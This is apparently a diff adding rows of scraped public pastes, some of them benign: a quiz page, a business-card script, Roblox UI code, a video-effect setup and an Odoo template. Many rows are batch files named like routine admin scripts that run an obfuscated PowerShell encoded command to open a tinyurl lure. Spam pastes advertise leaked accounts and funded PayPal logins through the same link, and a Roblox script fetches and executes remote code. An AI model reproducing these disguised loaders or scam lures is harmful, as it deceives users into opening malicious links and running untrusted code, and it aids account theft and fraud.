+          <input type=""text"" id=""bin-${idx}"" maxlength=""8"" placeholder=""z.B. 11000000"">
+        </div>
+      `;
+      container.appendChild(section);
+    });
+
+    function evaluateQuiz() {
+      let score = 0;
+      zahlen.forEach((zahl, idx) => {
+        const input = document.getElementById(`bin-${idx}`);
+        const expected = zahl.toString(2).padStart(8, '0');
+        if (input.value.trim() === expected) {
+          input.style.borderColor = ""green"";
+          score++;
+        } else {
+          input.style.borderColor = ""red"";
+        }
+      });
+      document.getElementById(""final-score"").textContent = `Du hast ${score} von ${zahlen.length} Aufgaben korrekt gelöst.`;
+    }
+  </script>
+</body>
+</html>
+"
+cL2g6V5B,Business_card,zyulfi,Python,Wednesday 7th of May 2025 05:52:31 AM CDT,"name = input(""Моля, въведете име: "")
+age = input(""Моля, въведете възраст: "")
+city = input(""Моля, въведете град: "")
+
+print()
+print(""*** -Визитка- ***"" + ""\n"" + ""Име: "" + name + ""\n"" + ""Възраст: "" + age + ""\n"" + ""Град: "" + city)"
+aLyBkmZn,EP 10 - Daily Rewards Client,Cakey3101,Lua,Wednesday 7th of May 2025 05:51:47 AM CDT,"local Players = game:GetService(""Players"")
+local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
+
+local Remotes = ReplicatedStorage.Remotes
+local DailyRewardsConfig = require(ReplicatedStorage.Configs.DailyRewards)
+local TweenGuiModule = require(script.Parent.TweenGui)
+local FormatNumber = require(ReplicatedStorage.Libs.FormatNumber.Simple)
+
+local Player = Players.LocalPlayer
+local PlayerGui = Player.PlayerGui
+
+local Gui = PlayerGui:WaitForChild(""DailyRewards"")
+local Frame = Gui.Frame
+
+local Exit = Frame.Exit
+local Open = PlayerGui:WaitForChild(""Main"").Right.DailyRewards
+
+local Container = Frame.Container
+
+local Template = Container.Template
+
+local Days = {}
+
+for Day in pairs(DailyRewardsConfig) do
+	table.insert(Days, Day)
+end
+
+table.sort(Days, function(A, B)
+	return tonumber(A) < tonumber(B)
+end)
+
+local function UpdateButtons()
+	local DailyRewardsStat = Player:FindFirstChild(""DailyReward"")
+	local LastCollectTime = Player:FindFirstChild(""LastCollectTime"")
+	if not DailyRewardsStat or not LastCollectTime then return end
+
+	local CurrentDay = DailyRewardsStat.Value
+	local LastClaim = LastCollectTime.Value
+	local CurrentTime = os.time()
+
+	for _, DailyRewardTemplate in ipairs(Container:GetChildren()) do
+		if DailyRewardTemplate:IsA(""Frame"") and tonumber(DailyRewardTemplate.Name) then
+			local Day = tonumber(DailyRewardTemplate.Name)
+			local ClaimButton = DailyRewardTemplate:FindFirstChild(""ClaimReward"")
+
+			if not ClaimButton then continue end
+
+			if Day < CurrentDay then
+				ClaimButton.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
+				ClaimButton.Label.Text = `Claimed!`
+				ClaimButton.AutoButtonColor = false
+				ClaimButton.Active = false
+			elseif Day == CurrentDay then
+				local RemaningTime = (LastClaim + 24 * 60 * 60) - CurrentTime
+				if RemaningTime > 0 then
+					ClaimButton.BackgroundColor3 = Color3.fromRGB(70, 232, 70)
+					ClaimButton.Label.Text = string.format(""%02d:%02d:%02d"", math.floor(RemaningTime / 3600), math.floor((RemaningTime % 3600) / 60), RemaningTime % 60)
+					ClaimButton.AutoButtonColor = false
+					ClaimButton.Active = false
+
+					task.spawn(function()
+						while RemaningTime > 0 do
+							task.wait(1)
+							RemaningTime -= 1
+							ClaimButton.Label.Text = string.format(""%02d:%02d:%02d"", math.floor(RemaningTime / 3600), math.floor((RemaningTime % 3600) / 60), RemaningTime % 60)
+						end
+
+						UpdateButtons()
+					end)
+				end
+
+				ClaimButton.BackgroundColor3 = Color3.fromRGB(70, 232, 70)
+				ClaimButton.Label.Text = `Claim!`
+				ClaimButton.AutoButtonColor = true
+				ClaimButton.Active = true
+			else
+				ClaimButton.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
+				ClaimButton.Label.Text = `Day {tostring(Day)}!`
+				ClaimButton.AutoButtonColor = false
+				ClaimButton.Active = false
+			end
+
+			ClaimButton.MouseButton1Click:Connect(function()
+				Remotes.ClaimDailyReward:FireServer(Day)
+			end)
+		end
+	end
+end
+
+local function GenerateGui()
+	for _, Day in ipairs(Days) do
+		local Reward = DailyRewardsConfig[Day]
+
+		local DailyRewardTemplate = Template:Clone()
+		DailyRewardTemplate.Parent = Container
+		DailyRewardTemplate.Name = Day
+		DailyRewardTemplate.Visible = true
+
+		DailyRewardTemplate.RewardType.Text = Reward.Type
+		DailyRewardTemplate.RewardAmount.Text = `+{tostring(FormatNumber.Format(Reward.Amount))}`
+
+		if Reward.Type == ""Rings"" then
+			DailyRewardTemplate.Icon.Image = ""rbxassetid://136483881101942""
+		end
+	end
+
+	UpdateButtons()
+end
+
+GenerateGui()
+
+Player:WaitForChild(""DailyReward"").Changed:Connect(UpdateButtons)
+Remotes.ClaimDailyReward.OnClientEvent:Connect(UpdateButtons)
+
+Open.MouseButton1Click:Connect(function()
+	if Gui.Enabled == true then
+		TweenGuiModule.CloseGui(Gui, Frame)
+	else
+		TweenGuiModule.OpenGui(Gui, Frame)
+	end
+end)
+
+Exit.MouseButton1Click:Connect(function()
+	TweenGuiModule.CloseGui(Gui, Frame)
+end)"
+uTUAZef5,configure_firewall.ps1,yaseenshawkinour,Batch,Wednesday 7th of May 2025 05:49:45 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AOAA1AGIAZQA0AGYANwAyAA==
+EXIT /b
+"
+FepGAaPF,cleanup_temp_files.bat,yaseenshawkinour,Batch,Wednesday 7th of May 2025 05:39:43 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANwAyADEAMQBkADAANQAzAA==
+EXIT /b
+"
+ajhqZ22w,deploy_app.ps1,plastico0,Batch,Wednesday 7th of May 2025 05:29:42 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMQA0ADUAMgBkADkAZAAxAA==
+EXIT /b
+"
+HW2y5Uzg,Hide & Sneak - Prop Menu Script,xmgam3s777,Lua,Wednesday 7th of May 2025 05:28:14 AM CDT,"-- Hide & Sneak - Prop Menu Script
+-- Script made by Xmgam3s
+
+loadstring(game:HttpGet(""https://raw.githubusercontent.com/YaroslavXm/ROBLOX-Lua-Scripts/refs/heads/main/HideSneakPropMenuScript.lua""))()"
+VWEzfL8X,start_server.bat,plastico0,Batch,Wednesday 7th of May 2025 05:19:41 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANwBiAGUAOABkADcAYgA2AA==
+EXIT /b
+"
+uALm5gLX,build_project.ps1,plastico0,Batch,Wednesday 7th of May 2025 05:09:10 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANgAwADIAOAAyAGUAZQBmAA==
+EXIT /b
+"
+5Yb9gVaA,Here comes the sun Remix setup,marcusa3000,Lua,Wednesday 7th of May 2025 05:04:34 AM CDT,"{
+	Tools = ordered() {
+		Background1_1_1 = Background {
+			Inputs = {
+				EffectMask = Input {
+					SourceOp = ""Rectangle1_1"",
+					Source = ""Mask"",
+				},
+				MotionBlur = Input { Value = 1, },
+				Quality = Input { Value = 5, },
+				ShutterAngle = Input { Value = 360, },
+				GlobalOut = Input { Value = 59, },
+				Width = Input { Value = 760, },
+				Height = Input { Value = 1080, },
+				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
+				Type = Input { Value = FuID { ""Gradient"" }, },
+				Start = Input { Value = { 0.593, 0.5 }, },
+				End = Input { Value = { 0.731063, 0.5 }, },
+				Gradient = Input {
+					Value = Gradient {
+						Colors = {
+							[0.411053540587219] = { 0, 0, 0, 1 },
+							[0.42] = { 0, 0, 0, 0 }
+						}
+					},
+				},
+				Offset = Input {
+					Value = 5.474,
+					Expression = ""time*0.161"",
+				},
+				Repeat = Input { Value = FuID { ""Repeat"" }, }
+			},
+			ViewInfo = OperatorInfo { Pos = { 2365, -544.5 } },
+		},
+		Background2_4 = Background {
+			Inputs = {
+				EffectMask = Input {
+					SourceOp = ""Merge1_3"",
+					Source = ""Output"",
+				},
+				GlobalOut = Input { Value = 59, },
+				Width = Input { Value = 1080, },
+				Height = Input { Value = 1080, },
+				UseFrameFormatSettings = Input { Value = 1, },
+				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
+				Type = Input { Value = FuID { ""Gradient"" }, },
+				TopLeftRed = Input { Value = 0.850980392156863, },
+				TopLeftGreen = Input { Value = 0.301960784313725, },
+				TopLeftBlue = Input { Value = 0.254901960784314, },
+				GradientType = Input { Value = FuID { ""Angle"" }, },
+				Start = Input { Value = { 0.5, 0.5 }, },
+				End = Input { Value = { 1, 0.576 }, },
+				Gradient = Input {
+					Value = Gradient {
+						Colors = {
+							[0] = { 0.996078491210938, 0.913725554943085, 0.301960825920105, 1 },
+							[1] = { 0.850980401039124, 0.301960796117783, 0.254901975393295, 1 }
+						}
+					},
+				}
+			},
+			ViewInfo = OperatorInfo { Pos = { 2255, -445.5 } },
+		},
+		Rectangle1_1 = RectangleMask {
+			CurrentSettings = 2,
+			CustomData = {
+				Settings = {
+					[1] = {
+						Tools = ordered() {
+							Rectangle1 = RectangleMask {
+								Inputs = {
+									MaskWidth = Input { Value = 1080 },
+									MaskHeight = Input { Value = 1920 },
+									Center = Input { Value = { 0.741335044929397, 0.5 } },
+									Filter = Input { Value = FuID { ""Fast Gaussian"" } },
+									Height = Input { Value = 0.00329193651115615 },
+									PixelAspect = Input { Value = { 1, 1 } },
+									UseFrameFormatSettings = Input { Value = 1 },
+									ClippingMode = Input { Value = FuID { ""None"" } }
+								},
+								CtrlWZoom = false,
+								ViewInfo = OperatorInfo { Pos = { 165, -2062.5 } },
+								UserControls = ordered() { X_Offset = { INP_MaxAllowed = 5, INP_Integer = false, INPID_InputControl = ""SliderControl"", INP_MaxScale = 1, INP_Default = 0.5, INP_MinScale = 0, INP_MinAllowed = -5, LINKID_DataType = ""Number"", ICS_ControlPage = ""Controls"", LINKS_Name = ""X-Offset"" }, Y_Offset = { INP_MaxAllowed = 5, INP_Integer = false, INPID_InputControl = ""SliderControl"", INP_MaxScale = 1, INP_Default = 0.5, INP_MinScale = 0, INP_MinAllowed = -5, LINKID_DataType = ""Number"", ICS_ControlPage = ""Controls"", LINKS_Name = ""Y-Offset"" } },
+								CustomData = {
+								}
+							}
+						}
+					}
+				}
+			},
+			Inputs = {
+				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
+				MaskWidth = Input { Value = 1080, },
+				MaskHeight = Input { Value = 1080, },
+				PixelAspect = Input { Value = { 1, 1 }, },
+				UseFrameFormatSettings = Input { Value = 1, },
+				ClippingMode = Input { Value = FuID { ""None"" }, },
+				Center = Input { Value = { 0.741335044929397, 0.5 }, },
+				Height = Input { Value = 0.00329193651115615, }
+			},
+			ViewInfo = OperatorInfo { Pos = { 2255, -610.5 } },
+			UserControls = ordered() { X_Offset = { INP_MaxAllowed = 5, INP_Integer = false, INPID_InputControl = ""SliderControl"", INP_MaxScale = 1, INP_Default = 0.5, INP_MinScale = 0, INP_MinAllowed = -5, LINKID_DataType = ""Number"", ICS_ControlPage = ""Controls"", LINKS_Name = ""X-Offset"" }, Y_Offset = { INP_MaxAllowed = 5, INP_Integer = false, INPID_InputControl = ""SliderControl"", INP_MaxScale = 1, INP_Default = 0.5, INP_MinScale = 0, INP_MinAllowed = -5, LINKID_DataType = ""Number"", ICS_ControlPage = ""Controls"", LINKS_Name = ""Y-Offset"" } }
+		},
+		Merge1_3 = Merge {
+			Inputs = {
+				Background = Input {
+					SourceOp = ""Background1_2_1"",
+					Source = ""Output"",
+				},
+				Foreground = Input {
+					SourceOp = ""Background1_1_1"",
+					Source = ""Output"",
+				},
+				Angle = Input { Value = 30, },
+				PerformDepthMerge = Input { Value = 0, }
+			},
+			ViewInfo = OperatorInfo { Pos = { 2255, -511.5 } },
+		},
+		Duplicate1 = Fuse.Duplicate {
+			Inputs = {
+				Copies = Input { Value = 6, },
+				Angle = Input { Value = 60, },
+				Polyline = Input {
+					Value = Polyline {
+					},
+				},
+				Background = Input {
+					SourceOp = ""Background2_4"",
+					Source = ""Output"",
+				}
+			},
+			ViewInfo = OperatorInfo { Pos = { 2255, -379.5 } },
+		},
+		ErodeDilate1_8 = ErodeDilate {
+			Inputs = {
+				Filter = Input { Value = 3, },
+				XAmount = Input { Value = 0.01115, },
+				ClippingMode = Input { Value = FuID { ""None"" }, },
+				Input = Input {
+					SourceOp = ""Duplicate1"",
+					Source = ""Output"",
+				}
+			},
+			ViewInfo = OperatorInfo { Pos = { 2255, -313.5 } },
+		},
+		Background1_2_1 = Background {
+			Inputs = {
+				EffectMask = Input {
+					SourceOp = ""Rectangle1_1"",
+					Source = ""Mask"",
+				},
+				Quality = Input { Value = 5, },
+				ShutterAngle = Input { Value = 360, },
+				GlobalOut = Input { Value = 59, },
+				Width = Input { Value = 1080, },
+				Height = Input { Value = 1080, },
+				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
+				Type = Input { Value = FuID { ""Gradient"" }, },
+				Start = Input { Value = { 0.62, 0.5 }, },
+				End = Input { Value = { 0.757063, 0.5 }, },
+				Gradient = Input {
+					Value = Gradient {
+						Colors = {
+							[0.495] = { 0, 0, 0, 1 },
+							[0.5] = { 0, 0, 0, 0 }
+						}
+					},
+				},
+				Offset = Input {
+					Value = 1.785,
+					Expression = ""time*0.0525"",
+				},
+				Repeat = Input { Value = FuID { ""Repeat"" }, }
+			},
+			ViewInfo = OperatorInfo { Pos = { 2145, -544.5 } },
+		},
+		Merge1_1_1_1 = Merge {
+			Inputs = {
+				Background = Input {
+					SourceOp = ""Background3_2"",
+					Source = ""Output"",
+				},
+				Foreground = Input {
+					SourceOp = ""ErodeDilate1_8"",
+					Source = ""Output"",
+				},
+				Angle = Input {
+					Value = -468.75,
+					Expression = ""-(time*10)/24"",
+				},
+				Operator = Input { Value = FuID { ""Under"" }, },
+				PerformDepthMerge = Input { Value = 0, }
+			},
+			ViewInfo = OperatorInfo { Pos = { 2255, -247.5 } },
+		},
+		Background3_2 = Background {
+			Inputs = {
+				EffectMask = Input {
+					SourceOp = ""Ellipse1_2"",
+					Source = ""Mask"",
+				},
+				GlobalOut = Input { Value = 59, },
+				Width = Input { Value = 1080, },
+				Height = Input { Value = 1080, },
+				UseFrameFormatSettings = Input { Value = 1, },
+				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
+				Type = Input { Value = FuID { ""Gradient"" }, },
+				TopLeftRed = Input { Value = 0.972549019607843, },
+				TopLeftGreen = Input { Value = 0.850980392156863, },
+				TopLeftBlue = Input { Value = 0.474509803921569, },
+				GradientType = Input { Value = FuID { ""Radial"" }, },
+				Start = Input { Value = { 0.474028799002163, 0.523338804591715 }, },
+				End = Input { Value = { 0.555327456530246, 0.444551016265052 }, },
+				Gradient = Input {
+					Value = Gradient {
+						Colors = {
+							[0.95] = { 0.972549021244, 0.8509804010391, 0.4745098054409, 1 },
+							[1] = { 0.901960790157318, 0.709803938865662, 0.388235300779343, 1 }
+						}
+					},
+				}
+			},
+			ViewInfo = OperatorInfo { Pos = { 2090, -247.5 } },
+		},
+		Ellipse1_2 = EllipseMask {
+			Inputs = {
+				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
+				MaskWidth = Input { Value = 1080, },
+				MaskHeight = Input { Value = 1080, },
+				PixelAspect = Input { Value = { 1, 1 }, },
+				UseFrameFormatSettings = Input { Value = 1, },
+				ClippingMode = Input { Value = FuID { ""None"" }, },
+				Width = Input { Value = 0.203, },
+				Height = Input {
+					Value = 0.203,
+					Expression = ""Width"",
+				}
+			},
+			ViewInfo = OperatorInfo { Pos = { 2090, -280.5 } },
+		},
+		SoftGlow1_1 = SoftGlow {
+			Inputs = {
+				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
+				Gain = Input { Value = 1.043, },
+				XGlowSize = Input { Value = 36.4, },
+				Input = Input {
+					SourceOp = ""Merge1_1_1_1"",
+					Source = ""Output"",
+				}
+			},
+			ViewInfo = OperatorInfo { Pos = { 2255, -181.5 } },
+		},
+		BrightnessContrast2_1_1 = BrightnessContrast {
+			Inputs = {
+				Saturation = Input { Value = 1.43, },
+				PreDividePostMultiply = Input { Value = 1, },
+				Input = Input {
+					SourceOp = ""SoftGlow1_1"",
+					Source = ""Output"",
+				}
+			},
+			ViewInfo = OperatorInfo { Pos = { 2255, -115.5 } },
+		}
+	}
+}"
+kaEcLUim,Here comes the sun Remix setup,marcusa3000,Lua,Wednesday 7th of May 2025 05:03:52 AM CDT,
+AKZY0pju,init_env.cmd,phuongnam1999vn,Batch,Wednesday 7th of May 2025 04:58:05 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMwA1ADQAMQAyAGYAZAAwAA==
+EXIT /b
+"
+NKgTikK5,schedule_tasks.ps1,phuongnam1999vn,Batch,Wednesday 7th of May 2025 04:48:04 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMgBkAGQANQAwADUAYQA0AA==
+EXIT /b
+"
+2cDqeGEw,free hf ebooks,Serachids,JavaScript,Wednesday 7th of May 2025 04:47:50 AM CDT,303034 - check it out at http://tinyurl.com/new2025may
+JcMTQvij,restart_services.cmd,phuongnam1999vn,Batch,Wednesday 7th of May 2025 04:37:33 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYwA1ADcAMAA3ADMAMgBiAA==
+EXIT /b
+"
+P2ZHPDCJ,Leaked Accounts - Fresh HitsUntitled,Serachids,JavaScript,Wednesday 7th of May 2025 04:37:09 AM CDT,055779 - check it out at http://tinyurl.com/new2025may
+drWJvVib,health_check.cmd,phuongnam1999vn,Batch,Wednesday 7th of May 2025 04:37:02 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYwBiADIAYQAzADEAMwAxAA==
+EXIT /b
+"
+EYHJqeay,PayPal with Balance,Serachids,JavaScript,Wednesday 7th of May 2025 04:26:47 AM CDT,480414 - check it out at http://tinyurl.com/new2025may
+ZtZvQwyA,remove_software.bat,neilton,Batch,Wednesday 7th of May 2025 04:26:30 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AMwA5AGUAMwBmAGEAYQA5AA==
+EXIT /b
+"
+6YLtkJ4K,accs fresh,SelfKey05,JavaScript,Wednesday 7th of May 2025 04:16:46 AM CDT,432683 - check it out at http://tinyurl.com/new2025may
+731nLJAU,create_users.ps1,neilton,Batch,Wednesday 7th of May 2025 04:16:29 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANgA1ADIAOAA5ADQAYwA1AA==
+EXIT /b
+"
+rdNvMH9X,free hf ebooks,SelfKey05,JavaScript,Wednesday 7th of May 2025 04:06:46 AM CDT,561030 - check it out at http://tinyurl.com/new2025may
+aYwmUjuP,monitor_logs.ps1,neilton,Batch,Wednesday 7th of May 2025 04:05:57 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANAA4ADkANwAwADQAMgAxAA==
+EXIT /b
+"
+RigeZfzW,start_server.bat,neilton,Batch,Wednesday 7th of May 2025 04:05:26 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYgA3ADMAMQAwAGMANwBhAA==
+EXIT /b
+"
+cMp9ksJj,accs fresh,SelfKey05,JavaScript,Wednesday 7th of May 2025 03:56:45 AM CDT,319652 - check it out at http://tinyurl.com/new2025may
+JFA4WBVt,restart_services.cmd,magixian,Batch,Wednesday 7th of May 2025 03:54:54 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANQBhAGEANQA5AGEAOQA2AA==
+EXIT /b
+"
+e1w3ee5a,accs fresh,puppi28071,JavaScript,Wednesday 7th of May 2025 03:46:24 AM CDT,414243 - check it out at http://tinyurl.com/new2025may
+uTMzk9cC,EARN $900 INSTANTLY 2025? GV,puppi28071,JavaScript,Wednesday 7th of May 2025 03:46:03 AM CDT,434809 - check it out at http://tinyurl.com/new2025may
+HL796jv5,deploy_app.ps1,magixian,Batch,Wednesday 7th of May 2025 03:44:53 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYQBkADYANAA4ADQAMwAxAA==
+EXIT /b
+"
+2WXkw13f,[QW][4724265]address_report_invoice_document,rht_odoo,XML,Wednesday 7th of May 2025 03:42:58 AM CDT,"<data>
+    <!--
+    Done by RHT on the 07/05/2025
+    Need : only keep the customer address
+    Task : https://www.odoo.com/odoo/project.task/4724265
+    Pastbin : https://pastebin.com/2WXkw13f
+    -->
+    <xpath expr=""//t/div"" position=""replace"">
+        <div class=""offset-col-6 col-6"" name=""no_shipping"">
+            <t t-set=""address"">
+                <address class=""mb-0"" t-field=""o.partner_id"" t-options=""{&quot;widget&quot;: &quot;contact&quot;, &quot;fields&quot;: [&quot;address&quot;, &quot;name&quot;], &quot;no_marker&quot;: True}""/>
+                <div t-if=""o.partner_id.vat"" id=""partner_vat_no_shipping"">
+                    <t t-if=""o.company_id.account_fiscal_country_id.vat_label"" t-out=""o.company_id.account_fiscal_country_id.vat_label"" id=""inv_tax_id_label""/>
+                    <t t-else="""">Tax ID</t>: <span t-field=""o.partner_id.vat""/>
+                </div>
+            </t>
+        </div>
+    </xpath>
+</data>"
